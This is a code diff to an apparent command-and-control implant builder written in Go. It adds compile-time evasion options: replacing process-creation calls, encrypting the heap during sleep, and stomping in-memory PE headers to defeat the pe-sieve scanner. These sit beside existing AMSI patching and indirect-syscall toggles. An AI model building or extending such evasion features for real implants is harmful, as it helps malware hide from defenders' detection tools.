@@ -59,6 +59,11 @@ type EvasionOpts struct {
 	AMSIPatch        bool
 	IndirectSyscall  bool   // HellsGate/HalosGate indirect syscall engine
 	SyscallMethod    string // "auto" | "hellsgate" | "halosgate"
+	NtProcess        bool   // Replace CreateProcessA with NtCreateUserProcess (issue #7)
+	HeapEncrypt      bool   // XOR-encrypt heap regions during sleep (issue #4)
+	PeStomp          bool   // Overwrite MZ/PE header in-memory to defeat pe-sieve
+	PeStompMode      int    // 1=DOS-only 2=full-NT-headers 3=sledgehammer
+	PeStompRandomise bool   // false=zero-fill true=pseudo-random fill
 }
 
 // PosixEvasionOpts holds compile-time evasion toggles (Linux/macOS).
@@ -147,6 +152,11 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 			AMSIPatch:        true,
 			IndirectSyscall:  true,
 			SyscallMethod:    "auto",
+			NtProcess:        true,
+			HeapEncrypt:      true,
+			PeStomp:          true,
+			PeStompMode:      2,
+			PeStompRandomise: false,
 		}
 		if evasion != nil {
 			ev = *evasion
@@ -167,6 +177,11 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 			"ENABLE_UNHOOK="+boolToFlag(ev.UnhookNtdll),
 			"ENABLE_INDIRECT_SYSCALL="+boolToFlag(ev.IndirectSyscall),
 			fmt.Sprintf("SYSCALL_METHOD=%d", syscallMethodInt),
+			"ENABLE_NT_PROCESS="+boolToFlag(ev.NtProcess),
+			"ENABLE_HEAP_ENCRYPT="+boolToFlag(ev.HeapEncrypt),
+			"ENABLE_PE_STOMP="+boolToFlag(ev.PeStomp),
+			fmt.Sprintf("PE_STOMP_MODE=%d", ev.PeStompMode),
+			"PE_STOMP_RANDOMISE="+boolToFlag(ev.PeStompRandomise),
 		)
 		switch strings.ToLower(outputFormat) {
 		case "exe":
